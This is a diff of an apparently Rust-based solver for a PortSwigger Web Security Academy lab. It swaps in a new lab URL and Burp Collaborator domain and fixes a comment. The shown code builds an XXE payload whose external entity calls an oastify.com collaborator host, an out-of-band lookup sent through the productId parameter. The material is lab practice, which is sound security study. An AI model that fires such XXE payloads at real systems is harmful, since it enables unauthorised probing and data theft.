@@ -32,17 +32,17 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a1e0044030862ae8121a258006400e3.web-security-academy.net";
+    let url = "https://0a29002d03c23eba81e1a34d001a00ca.web-security-academy.net";
 
     // change this to your collaborator domain
-    let collaborator = "bt81biqr56t7x2l5rfh735t39ufl3br0.oastify.com";
+    let collaborator = "nlcdup3fxo5bqte3dcvbuetf46axysmh.oastify.com";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
     println!("{} {}", "⟪#⟫ Injection point:".blue(), "productId".yellow(),);
 
-    // payload to to issue a DNS lookup to burp collaborator using an external entity
+    // payload to issue a DNS lookup to burp collaborator using an external entity
     let payload = format!(
         r###"<?xml version="1.0" encoding="UTF-8"?>
             <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{collaborator}">]>
